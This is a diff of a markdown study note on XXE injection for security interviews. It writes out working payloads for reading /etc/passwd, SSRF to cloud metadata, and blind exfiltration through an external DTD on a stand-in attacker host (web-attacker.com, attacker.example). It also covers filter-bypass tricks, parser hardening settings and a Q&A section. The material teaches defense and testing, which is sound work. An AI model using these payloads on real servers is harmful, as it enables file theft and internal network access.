@@ -2,6 +2,8 @@
 
 > XXE is not a bug in XML data, it is a dangerous default in the XML parser. The XML specification lets a document declare entities (named macros) in its DTD, and lets those entities be external: their value is a URI (a file path or URL) that the parser dereferences at parse time. When an application feeds attacker-influenced XML to a parser that still honors external entities and DTDs, the attacker can name any file or internal URL and have the parser fetch it. Root cause is therefore "the parser resolves external entities and external DTDs," not "the XML contained something malicious." Every mitigation is about turning those parser features off.
 
+**Interview frequency:** Common
+
 ## How it works
 
 XML documents can carry a Document Type Definition (DTD) inside an optional `DOCTYPE` at the top. The DTD can be internal (fully inline in the `DOCTYPE`), external (loaded from a URI via `SYSTEM`/`PUBLIC`), or a hybrid of both. The DTD is where entities are declared, and entities are the whole game.
@@ -49,10 +51,30 @@ sequenceDiagram
   D-->>D: Log request, file contents captured in query string
 ```
 
-Two structural rules from the XML specification drive the advanced attacks:
+Two structural rules from the XML specification drive the advanced attacks<sup>[[1]](#ref1)</sup>:
 
 - A parameter entity may be used inside the definition of another parameter entity only in an external DTD subset, not in an internal one. Nested parameter-entity tricks therefore need an external DTD (yours, over the network, or a local file already on disk).
 - An internal DTD may redefine an entity that an external DTD declared. This loophole is what makes the local-DTD-repurposing attack possible.
+
+## Quick reference
+
+```
+# Classic in-band file read: DTD declares an external entity, body references it
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+# Parser dereferences the SYSTEM URI at parse time and splices the file's bytes into &xxe;,
+# which the app reflects back, e.g. "Invalid product ID: root:x:0:0:..."
+```
+
+| Invariant | Where enforced | How violated | Source |
+|---|---|---|---|
+| DOCTYPE/DTD processing is disabled at the parser by an explicit feature flag, not screened in application code | XML parser factory config (`disallow-doctype-decl`, `XmlResolver = null`, `DtdProcessing.Prohibit`) | Default parser leaves DTDs enabled, so a submitted `<!DOCTYPE>` with `SYSTEM "file:///etc/passwd"` is parsed and dereferenced | <sup>[[2]](#ref2)</sup> |
+| External entity and external DTD resolution never crosses the trust boundary to an attacker-chosen URI | `external-general-entities` / `external-parameter-entities` / `load-external-dtd` parser settings | Parser is still permitted to fetch `SYSTEM` URIs, so pointing an entity at cloud metadata (`169.254.169.254`) turns XXE into SSRF | <sup>[[2]](#ref2)</sup> |
+| A parameter entity may nest inside another parameter entity's definition only within an external DTD subset | XML specification / parser's DTD-subset handling | Attacker hosts an external DTD purely to legally build the dynamic `%eval`/`%exfiltrate` chain for blind exfiltration | <sup>[[3]](#ref3)</sup> |
+| External DTD loading being off is what prevents local-DTD redefinition, not external-entity flags alone | Parser's external-DTD-loading toggle | An internal DTD redefines a parameter entity from an already-present on-disk DTD, rebuilding the exfiltration chain with zero network egress | <sup>[[4]](#ref4)</sup> |
+| Any XML-parsing pipeline reachable by user input (uploads, converters, rasterizers) gets the same hardening as the main API parser | Document/image ingestion pipeline (SVG/OOXML/SAML parsers), not just the primary endpoint | An SVG or DOCX upload is parsed by an unhardened thumbnailer/rasterizer even though the main API parser is hardened, reopening file read and SSRF | <sup>[[5]](#ref5)</sup> |
+| Entity-expansion depth/count is bounded independently of the DTD-disable setting | Parser's entity-expansion limit | Nested internal general entities (billion laughs) still exhaust memory even when external entities and DTD loading are fully disabled | <sup>[[1]](#ref1)</sup> |
 
 ## Attack techniques
 
@@ -66,7 +88,7 @@ Declare an external entity pointing at a file and reference it in a data value t
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
 
-Why it works: `SYSTEM "file:///etc/passwd"` makes the parser open the file and substitute its bytes for `&xxe;`, and the reflected `productId` carries them into the response (for example `Invalid product ID: root:x:0:0:...`). Confirmation: the file contents appear in the response. In real targets there are many data nodes; test each node individually, since only some are reflected. File reads via `file://` do not suffer the newline/URL-validation issues that plague the OOB `http://` exfil path, so in-band reads of `/etc/passwd` are reliable.
+Why it works: `SYSTEM "file:///etc/passwd"` makes the parser open the file and substitute its bytes for `&xxe;`, and the reflected `productId` carries them into the response (for example `Invalid product ID: root:x:0:0:...`).<sup>[[2]](#ref2)</sup> Confirmation: the file contents appear in the response. In real targets there are many data nodes; test each node individually, since only some are reflected. File reads via `file://` do not suffer the newline/URL-validation issues that plague the OOB `http://` exfil path, so in-band reads of `/etc/passwd` are reliable.
 
 ### 2. XXE to SSRF
 
@@ -77,11 +99,11 @@ Point the entity at an internal URL instead of a file.
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
 
-Why it works: the parser performs an HTTP GET from the server's network position, so it reaches internal-only services and cloud metadata endpoints (AWS IMDS `169.254.169.254`, GCP `metadata.google.internal`). If the entity value is reflected you get two-way SSRF (you see the response body, so you can read metadata and internal pages). If not, it is blind SSRF, still useful for hitting internal endpoints with side effects. XXE is one of the cleanest SSRF primitives because the parser follows the URL for you. Limitation: the entity value must be a valid URI, so you generally cannot smuggle raw `gopher://`-style CRLF payloads the way a full SSRF sink allows unless the platform registers that handler.
+Why it works: the parser performs an HTTP GET from the server's network position, so it reaches internal-only services and cloud metadata endpoints (AWS IMDS `169.254.169.254`, GCP `metadata.google.internal`).<sup>[[2]](#ref2)</sup> If the entity value is reflected you get two-way SSRF (you see the response body, so you can read metadata and internal pages). If not, it is blind SSRF, still useful for hitting internal endpoints with side effects. XXE is one of the cleanest SSRF primitives because the parser follows the URL for you. Limitation: the entity value must be a valid URI, so you generally cannot smuggle raw `gopher://`-style CRLF payloads the way a full SSRF sink allows unless the platform registers that handler.
 
 ### 3. Blind detection via out-of-band (OAST) interaction
 
-When nothing is reflected, prove the vulnerability by forcing a callback to infrastructure you control (Burp Collaborator is built for this).
+When nothing is reflected, prove the vulnerability by forcing a callback to infrastructure you control (Burp Collaborator is built for this).<sup>[[3]](#ref3)</sup>
 
 ```xml
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-ID.oastify.com"> %xxe; ]>
@@ -91,7 +113,7 @@ Why it works: even blind parsers still resolve the URI, causing a DNS lookup and
 
 ### 4. Blind exfiltration via a malicious external DTD
 
-Host a DTD on your server that reads a file into a parameter entity and beacons it out.
+Host a DTD on your server that reads a file into a parameter entity and beacons it out.<sup>[[3]](#ref3)</sup>
 
 Malicious DTD served at `http://web-attacker.com/malicious.dtd`:
 
@@ -112,7 +134,7 @@ Why it works: `%file` captures the file contents; `%eval` is a dynamic declarati
 
 ### 5. Error-based exfiltration
 
-When OOB egress is blocked but verbose parser errors are shown, coerce the file contents into an error message.
+When OOB egress is blocked but verbose parser errors are shown, coerce the file contents into an error message.<sup>[[3]](#ref3)</sup>
 
 External DTD:
 
@@ -127,7 +149,7 @@ Why it works: `%error` tries to open `file:///nonexistent/<contents-of-passwd>`,
 
 ### 6. Local DTD repurposing (no OOB egress at all)
 
-When you cannot load a remote DTD and cannot exfiltrate over the network, reuse a DTD file that already exists on the server's disk. This technique was pioneered by Arseniy Sharoglazov and ranked number 7 in PortSwigger's Top 10 Web Hacking Techniques of 2018.
+When you cannot load a remote DTD and cannot exfiltrate over the network, reuse a DTD file that already exists on the server's disk. This technique was pioneered by Arseniy Sharoglazov and ranked number 7 in PortSwigger's Top 10 Web Hacking Techniques of 2018.<sup>[[4]](#ref4)</sup>
 
 ```xml
 <!DOCTYPE foo [
@@ -233,7 +255,7 @@ Exploitation depends on the protocol handlers the runtime registers, not just on
 <!ENTITY xxe SYSTEM "netdoc:///etc/">
 ```
 
-`jar:file://...!/inner.txt` reads a single file from inside a ZIP or JAR on disk, useful when the target artifact is packaged rather than loose (web app WARs, signed JARs, Android APKs). `jar:http://.../x.jar!/file` is the interesting one: the JVM downloads the JAR to a temp file, extracts, and reads the inner path. If you keep the HTTP connection open (slow-drip the response so the archive never finishes downloading), the temp file lingers on disk with a predictable path, which is the documented XXE-to-file-upload technique from the Sharoglazov work: you have effectively written arbitrary bytes to the server's filesystem through an XML parser. `netdoc://` is a legacy Sun handler that returns directory listings on Java, enumerating directories which `file://` cannot. Naming these Java-specific handlers is a common senior probe because it separates candidates who understand "XXE is a URL fetch through the parser" from ones who only recognise the file-read syntax.
+`jar:file://...!/inner.txt` reads a single file from inside a ZIP or JAR on disk, useful when the target artifact is packaged rather than loose (web app WARs, signed JARs, Android APKs). `jar:http://.../x.jar!/file` is the interesting one: the JVM downloads the JAR to a temp file, extracts, and reads the inner path. If you keep the HTTP connection open (slow-drip the response so the archive never finishes downloading), the temp file lingers on disk with a predictable path, which is the documented XXE-to-file-upload technique from the Sharoglazov work<sup>[[4]](#ref4)</sup>: you have effectively written arbitrary bytes to the server's filesystem through an XML parser. `netdoc://` is a legacy Sun handler that returns directory listings on Java, enumerating directories which `file://` cannot. Naming these Java-specific handlers is a common senior probe because it separates candidates who understand "XXE is a URL fetch through the parser" from ones who only recognise the file-read syntax.
 
 ### 12. Adjacent parser sinks: XSD schemaLocation and XSLT document()
 
@@ -250,16 +272,17 @@ Second, XSLT: if the server transforms XML using an attacker-controlled styleshe
 
 ## Defense
 
-Ordered by effectiveness. The real fix is a parser configuration change, not input filtering.
+### Real fix
+
+The real fix is a parser configuration change, not input filtering.
 
 1. Disable DTDs entirely at the parser. This kills every XXE variant (file read, SSRF, OOB, error-based, local DTD, billion laughs) in one setting and is the recommended baseline whenever the app does not need DTDs.
 2. If DTDs cannot be fully disabled, disable external general entities, disable external parameter entities, and disable external DTD loading (set the external-access properties to the empty string so no protocol is allowed).
 3. Disable XInclude unless a feature explicitly requires it.
 4. Treat uploaded documents (SVG, OOXML, ODF) as untrusted XML: parse them only with a hardened parser, or strip the `DOCTYPE`/DTD before processing. The same parser hardening must cover the document/image pipeline, not just the main API.
-5. Defense in depth: egress filtering and cloud metadata protection (IMDSv2) blunt the SSRF and OOB impact if a parser slips through; entity-expansion limits blunt DoS.
-6. Where you own the interface, prefer a simpler format (JSON): no entities, no DTD, far smaller attack surface.
+5. Where you own the interface, prefer a simpler format (JSON): no entities, no DTD, far smaller attack surface.
 
-Per-parser hardening (the specifics interviewers probe), from the OWASP XML External Entity Prevention Cheat Sheet:
+Per-parser hardening (the specifics interviewers probe), from the OWASP XML External Entity Prevention Cheat Sheet<sup>[[5]](#ref5)</sup>:
 
 Java JAXP `DocumentBuilderFactory` / `SAXParserFactory` / DOM4J, strongest first:
 
@@ -333,23 +356,44 @@ from defusedxml.ElementTree import parse
 tree = parse("data.xml")   # forbids DTDs and external entities by default
 ```
 
-## Interview-grade nuances
+### Defense in depth
 
-- General entity vs parameter entity: general entities (`&x;`) work in the document body and drive in-band reads; parameter entities (`%x;`) work only inside the DTD and are mandatory for blind/OOB because you often cannot use a general entity where you need to build a dynamic declaration, and because hardening frequently blocks general external entities while leaving parameter entities. Senior candidates reach for parameter entities on any blind target by reflex.
-- Why the malicious DTD must be external: the nested "entity inside another entity's definition" construction is legal only in an external DTD subset. That is exactly why the OOB exfil DTD is hosted remotely (or, when egress is blocked, why you repurpose a local DTD file and exploit the internal-redefines-external loophole).
-- Billion laughs is DoS, not data theft. Conflating it with exfiltration is a junior tell. It also does not need external anything: it is pure internal entity expansion.
-- "We validate/WAF the input" is a weak answer. XXE is fixed at the parser, not by blacklisting `<!ENTITY` or `SYSTEM`. Attackers obfuscate with XML encoding, `PUBLIC` identifiers, UTF-16, or the content-type flip. Only disabling DTDs/external entities is reliable.
-- Regex-stripping `<!DOCTYPE` / `<!ENTITY` / `SYSTEM` before parsing is a very common wrong answer, and every layer of the trap is worth naming: (1) re-encode the payload as UTF-16LE/UTF-16BE with the appropriate byte-order mark, or as UTF-7, and the ASCII regex never matches, but the parser still decodes and processes the DTD; (2) use the `PUBLIC` identifier form `<!DOCTYPE foo PUBLIC "-//x" "http://attacker.example/x.dtd">` to dodge filters keyed on `SYSTEM`; (3) split the declaration across whitespace, newlines, or XML comments that the parser tolerates but the regex was not tuned for; (4) route around the sanitizer with a content-type flip so the JSON-side scrubber never runs on the XML body; (5) inject into an OOXML/SVG inner XML part that the pre-processor did not unzip before scanning. Only parser-level configuration (`disallow-doctype-decl` or the equivalent for the stack) is reliable, because any lexical filter can be encoded around.
-- Disabling external entities but leaving DTDs enabled is a partial fix: it stops file reads but can still allow parameter-entity DoS and, on some parsers, local DTD repurposing. Forbidding the `DOCTYPE` entirely (`disallow-doctype-decl`) is strictly stronger.
-- Default safety varies by platform and version, and interviewers reward precision: libxml2 >= 2.9 safe by default, PHP >= 8.0 safe by default, .NET `XmlReader` safe from 4.5.2+, but `XmlDocument` unsafe before 4.5.2, and Java factories require patched JREs (7u67 / 8u20) for the countermeasures to actually hold.
-- The highest-value real-world XXE is often not the obvious XML API: it is an SVG/DOCX/XLSX upload, a SAML assertion, or a JSON endpoint that also parses XML. Naming these hidden sinks separates staff-level answers.
-- OOB exfil of `/etc/passwd` over HTTP frequently fails on newlines due to URI character validation; pivot to FTP or a single-line target (`/etc/hostname`). Knowing this failure mode signals hands-on experience.
-- XXE to SSRF vs a general-purpose SSRF sink: XXE constrains you to valid URIs and the protocols the XML library registers, so exotic `gopher://`/CRLF gadgets may be unavailable even though internal HTTP and metadata reads work fine.
+1. Egress filtering and cloud metadata protection (IMDSv2) blunt the SSRF and OOB impact if a parser slips through; entity-expansion limits blunt DoS. Neither closes the parser-level flaw, they only reduce what a successful XXE can reach or how much damage a billion-laughs payload can do.
+
+## Interviewer probes
+
+Mid: "Why would you ever need a parameter entity instead of a regular entity for exfiltration?"
+
+Principal: General entities (`&x;`) only work inside the document body, so they drive in-band reads where the response is reflected back to you. Parameter entities (`%x;`) work only inside the DTD, which is exactly what you need to build a dynamic declaration for blind or OOB exfiltration, and hardening frequently blocks general external entities while leaving parameter entities untouched. Reaching for parameter entities by reflex on any blind target is the senior tell.
+
+Mid: "For the blind exfiltration technique, why does the malicious DTD have to be hosted externally instead of just inlined in the document?"
+
+Principal: Because the XML specification only permits a parameter entity to be used inside the definition of another parameter entity within an external DTD subset, not an internal one. That nested "entity inside another entity's definition" construction is exactly what the exfiltration chain needs to build a dynamic URL out of file contents, so it's structurally impossible to do inline. That's also why, when egress is fully blocked, the fallback is repurposing a DTD file that already exists on disk and exploiting the loophole that an internal DTD can redefine an entity an external DTD declared.
+
+Mid: "We found a billion-laughs style payload in a pentest report. How severe is that compared to a file-read XXE?"
+
+Principal: Different category entirely, it's denial of service, not data theft, and conflating the two is a junior tell. It's also worth knowing it needs no external anything: it's pure internal entity expansion, so it works even against a parser that has external entities and DTD loading fully disabled unless there's also an entity-expansion limit.
+
+Mid: "If we can't fully disable DTDs, can we just regex-strip `<!DOCTYPE`, `<!ENTITY`, and `SYSTEM` before the document reaches the parser?"
+
+Principal: That's a common wrong answer and it fails multiple independent ways. Re-encoding the payload as UTF-16 or UTF-7 slips past an ASCII regex while the parser still decodes and processes the DTD. The `PUBLIC` identifier form dodges a filter keyed only on `SYSTEM`. Splitting the declaration across whitespace or comments the parser tolerates but the regex wasn't tuned for gets through too. And a content-type flip routes the payload around a scrubber that only runs on the JSON path. XXE is fixed at the parser, not by blacklisting keywords, because every lexical filter can be encoded around.
+
+Mid: "We disabled external entities on our parser. Are we done?"
+
+Principal: That's a partial fix. It stops file reads and SSRF via external entities, but parameter-entity-driven DoS can still get through, and on some parsers local DTD repurposing still works because the DTD-loading machinery itself is still enabled. Forbidding the `DOCTYPE` entirely, `disallow-doctype-decl` or the platform equivalent, is strictly stronger and is the actual baseline recommendation.
+
+Mid: "Our main API doesn't accept XML, so we don't need to worry about XXE, correct?"
+
+Principal: The highest-value real-world XXE is rarely the obvious XML API. It's an SVG or DOCX/XLSX upload that gets rasterized or converted server-side, a SAML assertion sitting in the auth path, or a JSON endpoint that also happens to parse XML if you flip the `Content-Type` header. Naming those hidden sinks, not just the documented API, is what separates a staff-level answer from someone who only checks the obvious entry point.
 
 ## Sources
 
-- PortSwigger Web Security Academy, XXE injection: https://portswigger.net/web-security/xxe
-- PortSwigger Web Security Academy, Blind XXE: https://portswigger.net/web-security/xxe/blind
-- PortSwigger Web Security Academy, XML entities: https://portswigger.net/web-security/xxe/xml-entities
-- OWASP XML External Entity Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
-- Arseniy Sharoglazov, local DTD repurposing (PortSwigger Top 10 Web Hacking Techniques of 2018, #7): https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018
+<a id="ref1"></a>[1] PortSwigger Web Security Academy, "XML entities". Retrieved 2026. https://portswigger.net/web-security/xxe/xml-entities
+
+<a id="ref2"></a>[2] PortSwigger Web Security Academy, "XXE injection". Retrieved 2026. https://portswigger.net/web-security/xxe
+
+<a id="ref3"></a>[3] PortSwigger Web Security Academy, "Blind XXE". Retrieved 2026. https://portswigger.net/web-security/xxe/blind
+
+<a id="ref4"></a>[4] Arseniy Sharoglazov, local DTD repurposing, in PortSwigger, "Top 10 Web Hacking Techniques of 2018" (#7). Retrieved 2026. https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018
+
+<a id="ref5"></a>[5] OWASP, "XML External Entity Prevention Cheat Sheet". Retrieved 2026. https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
